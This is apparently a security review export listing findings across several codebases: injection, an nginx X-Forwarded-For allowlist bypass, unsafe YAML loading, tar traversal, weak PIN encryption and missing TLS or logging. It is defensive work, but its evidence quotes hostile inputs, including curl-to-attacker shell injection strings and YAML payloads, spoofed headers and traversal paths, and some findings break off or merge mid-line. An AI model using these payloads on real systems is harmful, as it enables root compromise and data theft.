findings.evidence: Line 24 reads $q = (string) ($request->getQueryParams()['q'] ?? '') and lines 26-28 concatenate it directly into WHERE subject LIKE '%" . $q . "%' OR body LIKE '%" . $q . "%', executed at line 30 with $this->pdo->query($sql) - no prepare, no binding, no escaping. The narrowing is real within my scope - no route in public/index.php reaches search(), and that is the only front controller I was given - but FP-11 requires the argument that no reachable path skips the narrowing, and I cannot make it: I was scoped to these ten files and cannot establish the deployment has no other entry point registering this controller. UNKNOWN caps this at probable, which is why it is reported as a latent defect at low severity rather than as an active injection.

findings.title: The database password falls back to an empty string when the environment does not supply one
findings.evidence: Line 13 is 'pass' => getenv('DB_PASS') ?: '' - an unconditional fallback, in a file index.php:15 requires on every request with no environment branch anywhere in it. The header comment (6-8) describes the literals as 'the local-dev fallbacks', but nothing in the code distinguishes local from production: display_errors on line 43 is the only environment-aware key and it gates error output, not this. Two details sharpen it. The ?: operator treats any falsy value as absent, so a password of '0' is discarded as well as an unset variable. And the mechanism that would normally populate the variable is declared and never invoked: composer.json:11 requires vlucas/phpdotenv, and grep for 'Dotenv' over the tree returns only that manifest line - nothing ever loads a .env file, so a deployment relying on one gets the fallback.
findings.impact: A deployment that omits DB_PASS - or supplies it only through a .env file that nothing loads - connects with an empty password instead of refusing to start. The failure is silent: the application serves traffic normally, so the missing credential is not discovered by operation. Whether the connection then succeeds depends on the database's own account policy, which is outside this repository.
findings.recommendation: Fail closed on missing configuration: require DB_DSN, DB_USER and DB_PASS to be present and throw at startup when any is absent, rather than substituting a literal. Use getenv('DB_PASS') compared against false rather than ?:, so a legitimate falsy value is not discarded. Either wire phpdotenv at the bootstrap or drop the dependency.

triage.reason: The path is not development-only in what ships. config/settings.php is required unconditionally at public/index.php:15, the return array has no environment branch, and the 'local-dev' framing exists only in the comment on lines 6-8 - which is prose, not a control.
This is a fail-open configuration defect rather than an injection; there is no attacker-supplied value in the construct.

A deployment that sets DB_PASS as a real process environment variable would never reach the fallback, and that would be the compensating control. No deployment artifact is in scope - the tree holds no Dockerfile, no systemd unit, no CI configuration and no .env - so I cannot establish it, and UNKNOWN caps this at probable.

scope.established_by: Enumerating config/settings.php key by key and identifying which keys are credentials; db.pass is the only one whose fallback is a security value rather than a location or a limit.
scope.narrowed_by: Only reached when DB_PASS is unset or falsy in the process environment. db.dsn (line 11) and db.user (line 12) have fallbacks too, but neither is a secret.

searched.for: an environment check, a production guard, or validation of the settings array before Db::connect
searched.found: nothing - line 15 requires the file and line 16 passes $settings['db'] straight to Db::connect with no assertion

findings.title: No security-event logging: impersonation and failed authentication leave no record
findings.evidence: The application writes no log of any kind: grep for monolog|logger|error_log|syslog over the tree returns exactly one line, the dependency declaration at composer.json:10, with no usage. The two events that most need a record have none. AdminController.php:67-71 inserts a session row granting one principal's identity to another and returns the token at line 73 without recording who requested it. AuthMiddleware::deny (70-76) builds a 401 response and writes nothing, so failed authentication against the token space is invisible. The configuration reinforces that this was meant to exist: settings.php:39 declares a log path from LOG_PATH and grep shows it has zero readers (only settings.php:38's sibling 'unit' key is consumed, at AdminController.php:84). The one logging that does happen is Slim's exception logging via addErrorMiddleware at index.php:39 - errors, not security events.
findings.impact: An impersonation - the highest-privilege action in the service, and unauthenticated today - cannot be attributed or even detected after the fact, and the resulting session is indistinguishable from a legitimate sign-in in every downstream record. Credential-guessing against the token space produces no signal. Incident reconstruction for any of the access-control findings would have nothing to work from.
findings.recommendation: Wire the declared monolog dependency to the declared logs.path and record the security events: impersonation (actor, target, tenant, resulting session id) at AdminController.php:71, authentication failures with the reason at AuthMiddleware.php:70, and administrative reads. Log the session id, never the token returned at AdminController.php:73.

triage.reason: No layer in the tree records these events. The only logging enabled anywhere is Slim's error logging (index.php:39), which fires on exceptions; a successful impersonation and a 401 denial are both non-exceptional paths and produce no entry.

The unrecorded events are the granting of another user's identity (AdminController.php:66-73) and failed authentication (AuthMiddleware.php:70) - the canonical security-relevant events, not routine traffic.

An external aggregator or reverse-proxy access log could record that a request to /admin/impersonate occurred, though not which user was impersonated, since that is in the request body. No such artifact is in scope, so I cannot answer DOES_NOT_HOLD, and it caps the finding at probable.

scope.established_by: A tree-wide grep for logging symbols returning only the composer.json dependency line, cross-checked against the two code paths that perform or refuse an authentication decision.
scope.narrowed_by: Slim's error middleware (index.php:39) does log exceptions with details, so unexpected failures are recorded; the gap is specific to security events on successful and cleanly-refused paths.

findings.title: nginx trusts X-Forwarded-For from every source, so the /admin/ IP allowlist is bypassable from the internet
findings.evidence: Lines 5-7 set `real_ip_header X-Forwarded-For; real_ip_recursive on; set_real_ip_from 0.0.0.0/0;`. With every address trusted and recursion on, ngx_http_realip_module walks the XFF chain right-to-left through trusted entries until it reaches the leftmost one, which is supplied verbatim by the client, so $remote_addr equals whatever the caller writes in the header. Line 43 `allow {{ admin_cidr }};` line 44 `deny all;` is ngx_http_access_module, which evaluates $remote_addr after realip has rewritten it. A request to /admin/ with `X-Forwarded-For: 10.42.7.1` (admin_cidr = 10.42.7.0/24, pillar/fleet.sls:28) passes the allow rule and is proxied to app_backend at line 46.
findings.impact: Unauthenticated internet access to the operator console on every edge node. The same rewrite poisons $proxy_add_x_forwarded_for at line 34, so the chain the backend receives for /api/ is entirely attacker-authored: any backend rate limiting, geo-fencing, audit logging or IP allowlisting keyed on it is equally forgeable. The three realip directives sit at http level in /etc/nginx/conf.d/edge.conf, so they also apply to every other server block on the host.
findings.recommendation: Replace `set_real_ip_from 0.0.0.0/0` with the actual load-balancer prefixes (a new pillar key rendered as one set_real_ip_from per entry), and keep real_ip_recursive on only once that list is exhaustive. Do not rely on an IP allowlist alone for /admin/: add mutual TLS or an authenticated session at the proxy.

triage.reason: The only control on /admin/ in this tree is the allow/deny pair at nginx.conf.jinja:43-44, which is the control being bypassed. No auth_request, no mTLS (ssl_verify_client absent), and the state that renders this file adds nothing else.
The value is a request header written by the caller; `set_real_ip_from 0.0.0.0/0` at line 7 is precisely the declaration that no origin is excluded.

The intended exposure is the 443 listener; /admin/ is explicitly declared as NOT part of it ('restricted to the management network', line 41). The finding is that the boundary drawn at line 43 does not hold.
The construct is wider than it reads, not narrower: lines 5-7 are at http level in conf.d/edge.conf, so they apply to every server block on the host, and no condition in this file narrows them.

scope.established_by: Walked the template directive by directive, traced which directives read $remote_addr (allow/deny at :43-44) and which write it (realip at :5-7), then traced the rendered file back to the state that installs it and the pillar key that fills admin_cidr.
scope.narrowed_by: Reaches only minions matched by 'roles:edge-proxy' in salt/top.sls:5-8 - which a minion selects for itself (see the grain-targeting finding).

searched.for: a second authentication layer on /admin/ (auth_basic, auth_request, ssl_verify_client, satisfy)
searched.found: nothing - location /admin/ (lines 42-48) contains only allow/deny, proxy_pass and one proxy_set_header

searched.for: any other managed nginx file, snippet or include that could re-narrow set_real_ip_from or add auth
searched.found: nothing - the state manages exactly one file, /etc/nginx/conf.d/edge.conf, plus the package and the service

searched.found: nothing - the webproxy block defines only upstream_host, upstream_port, admin_cidr and widget_origin

findings.title: fleetctl.drain builds a shell command by concatenating an unvalidated node_id, while its sibling rotate_key validates the same value
findings.evidence: Lines 46-57: `cmd = AGENT_BIN + " drain --node " + node_id + " --wait " + str(int(wait_seconds)) + " | tee -a /var/log/fleet/drain.log"` then `subprocess.run(cmd, shell=True, ...)`. node_id reaches the shell unquoted and unvalidated. wait_seconds is coerced with int() on the same line, and rotate_key (line 64) rejects a node_id failing NODE_RE (line 20, ^[a-z0-9][a-z0-9-]{2,62}$) before passing it to a list-form subprocess call - so the module's own author treated this value as untrusted everywhere except here. node_id='a; curl http://attacker/x | sh #' executes as the salt-minion user, i.e. root.
findings.impact: Root command execution on any minion where the call lands. The module docstring states every function is callable as fleetctl.<name> from an sls file, the CLI or a reactor - a reactor is the sharpest path, because reactors are commonly wired to minion-fired events and pass event payload fields straight into module arguments, turning a single compromised minion into root on every other minion it can name.
findings.recommendation: Apply the existing guard: `if not NODE_RE.match(node_id or ''): raise ValueError(...)` as the first statement of drain, and drop shell=True by replacing the pipe with a list-form call plus an explicit append to /var/log/fleet/drain.log in Python.

triage.reason: The compensating control exists in the file and is not on this path: NODE_RE is applied at fleetctl.py:64 inside rotate_key only. Nothing between a caller and drain re-checks it.
node_id is a caller-supplied parameter (line 44). The presence of a validator on the sibling function is direct evidence the author did not consider it constrained.
The sink is subprocess.run(..., shell=True) at lines 55-57, which passes the concatenated string to /bin/sh; the `| tee` in the command string is itself proof the string is shell-parsed.
salt/_modules/ is synced verbatim to every minion by saltutil.sync_modules; there is no build step that strips it and no environment flag guarding it.

scope.established_by: Read the module function by function and compared the two functions taking the same parameter name; grepped the whole tree for callers of fleetctl.drain.
scope.narrowed_by: No in-tree caller: the only cross-module call in this tree is fleetctl.enroll from salt/_states/enrollment.py:29. Reachability is via CLI, reactor or an sls outside this tree.

findings.title: fleetctl.manifest deserializes a network-fetched document with yaml.Loader, the unsafe PyYAML loader
findings.evidence: Lines 38-41: `resp = requests.get(url, timeout=20)` then `return yaml.load(resp.text, Loader=yaml.Loader)`. yaml.Loader binds yaml.constructor.Constructor, which registers the `tag:yaml.org,2002:python/object/apply:` multi-constructor - a manifest containing `!!python/object/apply:os.system ['curl http://attacker/x | sh']` executes on load. url defaults to the pillar value fleet:manifest_url (line 37) but is also an ordinary function parameter, so `salt '*' fleetctl.manifest url=http://attacker/m.yaml` is a one-liner.
findings.impact: Arbitrary code execution as root on every minion that calls fleetctl.manifest, for anyone who can serve or tamper with the manifest endpoint. The docstring's justification ('richer than plain key/value data') does not require the unsafe loader: nested mappings, sequences, booleans and timestamps all parse under yaml.safe_load; only Python object construction needs yaml.Loader.
findings.recommendation: Use yaml.safe_load(resp.text). If the manifest genuinely needs a non-standard tag, register that one constructor on a SafeLoader subclass rather than enabling all of them. Also pin the manifest by signature or digest if the control plane can sign it.

triage.reason: The parsed bytes are an HTTP response body (line 38), and the URL itself is a caller-controlled parameter with a pillar fallback (line 37). Neither is a literal.

yaml.Loader is the unsafe loader, not SafeLoader or FullLoader: its constructor class registers python/object/apply, which calls arbitrary callables. This is the exact sink PyYAML's documentation warns about.
The module is synced to every minion by saltutil.sync_modules per its own docstring; there is no debug flag or build variant that removes it.
The only integrity control on the response is TLS to fleet.internal.example. TLS authenticates the host, it does not make the host trusted, and it is skippable by passing an http:// url argument.

scope.established_by: Read every deserialization and network call in the module; checked which PyYAML loader class is named and what its constructor registry allows.
scope.narrowed_by: Not narrowed - manifest() has no in-tree caller, so exploitation needs a CLI/reactor/sls call, but the module is present on every minion because salt/top.sls:2-3 matches '*'.

searched.for: a schema check, allowlist or type assertion applied to the manifest after loading
searched.found: nothing - the parsed object is returned directly to the caller at line 41

searched.for: an in-tree caller of fleetctl.manifest that would pin the url or verify a signature
searched.found: no caller; manifest_url is declared at pillar/fleet.sls:6 and read only here

findings.title: telemetry-register-node interpolates a minion-controlled grain and a CMDB-sourced pillar value into a root cmd.run shell command
findings.evidence: Line 2 `{% set labels = telemetry.get('extra_labels', '') %}` and line 3 `{% set rack = salt['grains.get']('rack_id', '0') %}` are rendered straight into the cmd.run name at lines 34-38: `--label rack={{ rack }}` and a bare `{{ labels }}`. cmd.run executes its name through the shell, so a semicolon or $(...) in either value chains commands as root. extra_labels is documented at pillar/fleet.sls:20-22 as mirrored out of the CMDB asset record by the nightly pillar sync, 'so it changes whenever someone edits the rack entry in the asset browser'. labels is deliberately unquoted so it can split into two arguments, which is why the usual quoting fix was not applied.
findings.impact: Privilege escalation from 'can edit a rack entry in the asset browser' to root on every node that receives the telemetry state - per salt/top.sls that is every minion with role edge-proxy or collector. The grain path is the second vector: grains are set on the minion, so a non-root process able to write grains earns root at the next highstate, and a compromised minion can hold root through a rebuild of the salt-minion package.

Write the labels into /etc/telemetry/agent.yaml via the existing file.serialize state and have the agent read them, or validate both values against ^[A-Za-z0-9_.=-]+$ in a small custom module before rendering. If the shell form must stay, quote each label individually and reject shell metacharacters at pillar-sync time.

extra_labels is documented as mirrored from an asset record editable in a web UI; rack_id is a grain, i.e. minion-side state. Neither is a constant, and the current literal value is the current content, not a constraint.
The sink is the Salt cmd.run state, whose name is executed through a shell; the multi-line YAML folded scalar at :34 produces one shell command line.
The construct applies wherever the telemetry state applies, which salt/top.sls:5-12 gives to both the edge-proxy and collector roles; no condition in the state narrows it to a subset.

findings.title: Telemetry agent package is fetched over cleartext HTTP with no source_hash and installed as root with dpkg -i
findings.class: Download of code without integrity check
findings.evidence: Line 8 `- source: {{ telemetry['agent_package_url'] }}` resolves to pillar/fleet.sls:23 `http://packages.internal.example/edge/telemetry-agent_3.4.1_amd64.deb` - plain HTTP, no TLS. The file.managed block (lines 5-10) declares no source_hash and no signature check, and the next state (lines 12-17) runs `dpkg -i /var/cache/fleet/telemetry-agent.deb` as root on it. Every other endpoint in the pillar is https; this one is the exception.
findings.impact: Anyone who can answer for packages.internal.example - DNS or ARP spoofing on the edge network, a compromised internal mirror, an on-path device between an edge site and the package host - substitutes a .deb whose maintainer scripts run as root at install. That is root on every node carrying the telemetry state.
findings.recommendation: Change agent_package_url to https, add a source_hash pinned to the published sha256 of the package, and prefer installing from a signed apt repository via pkg.installed with a version pin over downloading and dpkg -i.

triage.reason: Salt's own file client refuses a remote source with neither source_hash nor skip_verify, which would make the state error rather than fetch an unverified package. That control lives in the Salt runtime, not in this repository, and no version is declared anywhere in this tree, so I cannot show it is in force. This caps the finding at probable.
No minion version, no apt pinning policy and no network policy for packages.internal.example is present in the tree; there is no exported artifact or written statement to accept.

findings.title: tar.extractall on a remotely-supplied archive with no member validation, and the returned path list is built from raw member names
findings.evidence: transforms.py:49-55: `with tarfile.open(archive_path, "r:*") as tar: members = [m for m in tar.getmembers() if m.isfile()]; tar.extractall(path=destination)` - the filtered members list is computed and then NOT passed to extractall, so directories, symlinks and hardlinks are extracted too, and no filter= argument is given. A member named ../../../../opt/airflow/dags/evil.py writes outside destination. Separately, line 55 returns [os.path.join(destination, m.name) for m in members]: for an absolute member name os.path.join discards the prefix and yields /etc/shadow (verified), and dags/ledger_sync.py:24 then open()s each returned path and pushes the parsed contents into the warehouse. The archive is untrusted: operators.py:69 downloads it from a URL named by a remote manifest, and no checksum or signature is verified anywhere between the download and the extraction.
findings.impact: Two distinct primitives from one malicious or compromised vendor delivery. Write: arbitrary file creation as the worker user, including into the DAGs directory, which Airflow parses and executes - remote code execution on the scheduler and every worker. Read: arbitrary local file contents pulled into ledger.postings and out to the finance share. The absolute-name read path does not depend on the extraction filter, so it survives even on a Python version where extractall defaults to filter='data'. findings.title: SecureBox derives its AES key from a constant, so the wrapped PIN is unwrappable by anyone holding the app
findings.evidence: crypto.dart:17-22: the key is sha256('courier-app-v3:$installationId') - a hardcoded salt and one identifier, with no secret input and no KDF. installationId comes from session.dart:26 `_prefs.getString(kInstallationId) ?? 'unknown'`, and grepping the component for a writer of kInstallationId returns none: the comment says it is 'generated on first launch', but nothing in this component ever writes it. As given, every installation derives the identical key from sha256('courier-app-v3:unknown').
findings.impact: The encryption around the driver's PIN is decorative. In the branch as written the key is a compile-time constant recoverable from the app by anyone, so a sealed PIN taken from any device is decrypted offline. In the other branch - the identifier is written by code outside this component - the key is derived from a value that lives in plaintext SharedPreferences, so an attacker who can read the sealed blob can read the identifier from the same directory and rederive the key. The finding holds either way; only its blast radius changes.

Generate a key in the Android Keystore with setUserAuthenticationRequired(true), non-exportable, and use it to wrap the PIN - or stop storing the PIN and store only a salted, memory-hard hash if a local comparison is needed. If a passphrase-derived key is kept, use a real KDF with a per-install random salt stored beside the ciphertext.

findings.title: AES-CBC with a fixed all-zero IV, deliberately pinned across builds
findings.class: Generation of predictable IV with CBC mode
findings.evidence: crypto.dart:26 `static final enc.IV _iv = enc.IV.fromLength(16);` - a 16-byte zero-filled IV, static so it is the same value for every install, used for both seal (crypto.dart:30) and open (crypto.dart:35) in AESMode.cbc. The comment at crypto.dart:24-25 states the fixing is intentional.
findings.impact: CBC with a constant IV is deterministic: the same plaintext always produces the same ciphertext. Composed with the constant key, the entire PIN space - 10^4 or 10^6 values - can be precomputed once and the sealed blob looked up, so recovery is instant rather than merely possible. Independently, identical sealed values across devices reveal that two drivers chose the same PIN. The ciphertext is also unauthenticated, so it is malleable.
findings.recommendation: Use AES-GCM with a fresh random nonce per operation, stored alongside the ciphertext - which also solves the upgrade concern in the comment, since the nonce travels with the value and never needs to be reproduced by a later build. If CBC must stay, generate a random IV per encryption, prepend it to the ciphertext, and add an encrypt-then-MAC layer.

triage.reason: There is no benign reading: IV.fromLength(16) allocates a zero-filled buffer, the field is static final, and the comment states the value is fixed on purpose. The stated reason (opening old values after an upgrade) is a real requirement solved correctly by storing the nonce with the ciphertext.
Nothing compensates: seal and open are the only crypto entry points in the component and both take the same constant _iv; no envelope format carries a per-value nonce.
The protected value is the driver's unlock PIN, which the file's own comment treats as a secret that must never leave the handset.

scope.narrowed_by: uploadFingerprint (crypto.dart:40-41) does not use this envelope, so it is out of this finding's scope.

A grep for normalize|startsWith|toRealPath|canonical across all of src/ returns only TokenVerifier.java:68 (the Bearer prefix check). Query values are URL-decoded by Vert.x and not path-normalized, so %2e%2e%2f arrives as ../ too.

Every expiry audit record is deleted microseconds after it is created, by design of the schema.

For a records-management vault operating a 2555-day retention window on an EU cold archive, there is no record of which documents were destroyed, when, or whether the destruction was correct. Any deletion an attacker induces is indistinguishable from routine expiry.

Drop the foreign key or change it to ON DELETE SET NULL, and denormalise the identifying fields the audit needs (blob_key, owner_id, title) into audit_events. findings.title: PostgreSQL connection options omit sslMode, so the client negotiates no TLS
findings.evidence: Lines 45-52 construct PgConnectOptions setting exactly five properties - setHost, setPort, setDatabase, setUser, setPassword - and no TLS configuration: no setSslMode, no setSsl, no setTrustOptions, no setHostnameVerificationAlgorithm. The peer is a remote host: config.json:7 gives host pg-vault.internal.example on port 5432. config.json's db block contains no ssl key either, and bootstrap never reads one.
findings.impact: The database password is exchanged in the clear at connection time, and every row the vault reads or writes crosses the network unencrypted - including owner_email, which RetentionSweeper selects at line 42, and the titles and blob keys of every archived document. Anyone positioned on the path reads the archive catalogue and captures the credential.

VERIFY_FULL rather than REQUIRE, since REQUIRE encrypts without authenticating the peer. Drive it from a config key so non-production environments differ explicitly rather than by omission.

A network boundary is crossed. config.json:7 names a remote DNS host, not localhost or a unix socket, so the session traverses infrastructure between two machines.

A service mesh or sidecar could tunnel the connection transparently, which would make the cleartext client setting harmless in practice. No deployment manifest, mesh configuration or network policy exists in the component and none was provided, so this ships as probable. findings.title: Retention sweep failures are silently discarded, and one failing document aborts every remaining document in the batch
findings.class: Improper check for unusual or exceptional conditions
findings.evidence: Two compounding defects. (1) `vertx.setPeriodic(periodMillis, timer -> sweep())` at line 38 - setPeriodic takes a Handler<Long> returning void, so the Future<Integer> that sweep() returns is discarded, and no onFailure or onComplete is attached anywhere. Any failure of the sweep is invisible. (2) expire (lines 50-77) accumulates all documents onto a single sequential chain: each iteration does chain = chain.compose(...) for delete, insert and delete. Future.compose propagates failure without invoking the mapper, so the first document whose blob delete at line 62 fails short-circuits every subsequent document in the batch of up to 500. There is also no transaction around the insert at 64 and the delete at 69.
findings.impact: The retention control fails silently and in bulk. A single blob whose file is already absent makes vertx.fileSystem().delete() fail, aborting the remaining documents in that sweep, and because the delete precedes the DB row removal the position is not advanced either, so the same failing document heads the next sweep an hour later and blocks it again. Retention deletion stops indefinitely with no log line, no metric and no alert, in a system whose whole purpose is enforcing a 7-year disposal schedule.
findings.recommendation: Attach a failure handler at line 38 so the job cannot fail invisibly, and export a success/failure metric. Isolate documents from one another with Future.join or a per-document recover so one failure does not abort the batch. Reorder to delete the blob last, after the audit row and the catalogue row are committed, and wrap the insert and delete in a single transaction.

This is a reliability-of-control finding rather than a cross-principal access finding; the question of a second principal does not bear on it.
The impact does reach the user: this is the load-bearing enforcement of the retention policy, not a redundant secondary check. When it stops, nothing else deletes expired documents.

findings.title: No authentication or blob-access events are logged anywhere in the service
findings.evidence: handle() rejects a missing token at line 69 and an invalid one at line 79, in both cases writing a JSON error to the response and recording nothing. TokenVerifier declares no logger. Neither does MainVerticle, BlobStore, MetadataRepository or ManifestParser - the sole Logger in the component is RetentionSweeper's, used for the single line at line 58. So the component records: nothing on authentication failure, nothing on successful authentication, nothing on blob download, nothing on manifest ingest, nothing on any 401, 404 or 500. [Lead correction: returned as confirmed while answering FP-08 UNKNOWN and FP-10 HOLDS; the triage invariant forbids that with confirmed, so the status is lowered to probable. The code facts are unchanged.]
findings.impact: There is no way to detect or reconstruct an attack against this service. Credential stuffing against /v1/metadata produces no record; and because /v1/blobs is unauthenticated and traversable, an attacker enumerating blob keys or reading /etc/vault/jwks.json leaves the vault with no evidence that it happened. Combined with the cascade that destroys the one audit record the system does write, the component has no retained security-relevant history at all.
findings.recommendation: Log authentication failures at WARN with the source address, the failure reason and a correlation id - but not the token. Log blob downloads with the resolved key and the authenticated ownerId once the auth bypass is fixed, since a document vault needs an access record per object. Feed these into vault.audit_events rather than only the application log.

triage.reason: No logging layer exists above the handler that could be recording these events: Vert.x installs no access log by default and MainVerticle registers no LoggerHandler - the only handlers on the root router are BodyHandler and the route handlers themselves.

An ingress or service mesh might produce HTTP access logs covering request paths and status codes. No deployment configuration exists in the component and none was provided. Even a full access log would not carry the authenticated identity or the outcome of token verification, so it would not close this gap.

This is a detection and accountability gap rather than an exploit primitive: it grants an attacker no capability, it removes the ability to notice one. Per FP-10 that bounds the severity to low without deleting the finding, and it is written down because it is what makes the auth bypass and the traversal unobservable in practice.

findings.title: HTTP server created without TLS, so bearer tokens and document bytes travel in cleartext
findings.evidence: `vertx.createHttpServer().requestHandler(root).listen(config.getJsonObject("http").getInteger("port", 8087))` at lines 82-84 - createHttpServer is called with no HttpServerOptions, so setSsl is left at its false default and no key store is configured. config.json:2-5 declares port 8087 and host 0.0.0.0 with no TLS keys; the declared host is never read, since listen(int) is the port-only overload.

findings.title: The committed promptbridge gateway keys are the live inbound credentials for /v1; no mechanism can replace them at deploy time
findings.evidence: config.yaml:15,17 define two client keys (values redacted; both ~26-char lowercase ASCII literals of the shape vk_<name>_placeholder_0000). server.py:23 sets CONFIG_PATH = pathlib.Path(__file__).with_name('config.yaml') - the file is read from inside the installed package, not from a deploy-time location. load_config() (server.py:26-28) takes no environment input. create_app() (server.py:136,146) passes config['auth']['clients'] straight into BridgeKeyMiddleware, whose dispatch() (server.py:40-46) accepts the request when hmac.compare_digest(presented, expected) matches one of those literals and returns 401 otherwise. A grep for environ/getenv across promptbridge-mlflow/ returns exactly one hit, BRIDGE_LOG_LEVEL at server.py:160 - there is no override for auth. LEAD NOTE: the ai-safety specialist dropped this same construct as FP-02 HOLDS ('literal placeholders'). The lead kept the supply-chain reading and overturned that dismissal, because FP-02's exculpation requires that a real value replaces the placeholder at deploy time, and the substitution mechanism was searched for and does not exist.
findings.impact: The two literals in the repository are the complete set of credentials accepted on /v1. They are low-entropy, self-describing, and identical in every deployment of this package. Anyone who can read the source - or guess the pattern - reaches POST /v1/score, which passes a caller-supplied model_uri into mlflow.pyfunc.load_model (registry.py:46) and runs model-emitted tool calls including an eval() calculator (tools.py:48). gateway.bind is 0.0.0.0 (config.yaml:2), so the surface is every interface the host has.
findings.recommendation: Read the client keys from the process environment or a secret manager and fail startup when they are absent, rather than defaulting to a literal. Rotate both keys. If a committed sample is wanted, ship it as config.yaml.example and have load_config() refuse to start on a value that matches the sample.

triage.reason: This is the rule that would normally save a value named '...placeholder...'. It does not apply here: a placeholder in a .env.example grants nothing because a real value replaces it at deploy time, and there is no replacement mechanism in this package. server.py:26-28 reads only the packaged file and the only environment variable consulted anywhere in the component is BRIDGE_LOG_LEVEL. The literal is the value the running server compares against, so it grants access exactly as written.

config.yaml sits inside the bridge package next to server.py, and pyproject.toml:19 declares the console entry point promptbridge = 'bridge.server:main'; main() calls load_config() with no argument. The shipped path is the one that reads these keys.
config.yaml:2 binds 0.0.0.0. Nothing in the component bounds the exposure to a trusted network.
BridgeKeyMiddleware is the only authentication in the component; no second layer sits in front of it in this tree.

findings.title: Cross-component: a client-supplied X-Forwarded-For satisfies the admin_cidr allow that is the only control in front of support-desk-api's unauthenticated /admin group
findings.class: Authentication bypass by spoofing / cross-component trust coupling
findings.evidence: nginx.conf.jinja:5-7 sets real_ip_header X-Forwarded-For, real_ip_recursive on, set_real_ip_from 0.0.0.0/0 - every source address is trusted to declare its own client address, so $remote_addr becomes fully client-controlled. nginx.conf.jinja:42-44 then guards the operator console with location /admin/ { allow {{ admin_cidr }}; deny all; }, where admin_cidr is 10.42.7.0/24 (pillar/fleet.sls:28). ngx_http_access_module evaluates allow/deny against $remote_addr at the ACCESS phase, after realip has rewritten it at POST_READ, so a request carrying X-Forwarded-For: 10.42.7.9 passes the allow, and is proxied to app_backend (line 46). On the other side, support-desk-api/public/index.php:58-63 registers the /admin group with no middleware - contrast line 55, where /tickets carries ->add(new AuthMiddleware($pdo)) - and the comment on line 57 states the console 'is only published on the internal VLAN', naming the network restriction as the control. /admin/impersonate (AdminController.php:56-74) mints a valid 30-minute session for any user_id supplied in the body and returns the token.
findings.impact: If app_backend fronts support-desk-api, one spoofed request header converts an internet-facing edge proxy into unauthenticated access to the operator console, and /admin/impersonate turns that into a session token for any account in any tenant. Neither half is visible from inside one component: the PHP reviewer sees a documented network control, the Salt reviewer sees a permissive realip setting, and only the join shows the control does not hold.
findings.recommendation: Restrict set_real_ip_from to the regional load balancer addresses instead of 0.0.0.0/0, so $remote_addr can only be rewritten by a trusted hop. Independently - and regardless of the proxy fix - put authentication and an operator-role check on the /admin group in index.php:58, because a network ACL enforced in a different repository is not a control this service can rely on.

triage.reason: The only candidate compensating control is the nginx allow at line 43, which is the control being bypassed. index.php:58-63 adds no middleware to the /admin group.

Checked whether the realip directive applies more narrowly than it reads. It is declared at server-file scope above all location blocks (lines 5-7) and is therefore in effect inside location /admin/; no location-level override re-narrows it.
X-Forwarded-For is a request header written by the caller. With set_real_ip_from 0.0.0.0/0 no upstream is required to be trusted before it is believed.

Whether app-blue.internal.example:8443 (pillar/fleet.sls:26-27) is the host running support-desk-api is not established anywhere in this tree - there is no deployment manifest, inventory or compose file. The two components describe the same asset ('operator console', restricted by network, at /admin) but the mapping is inferred, not evidenced. This caps the finding at probable; an inventory record or deployment descriptor naming the upstream would settle it.
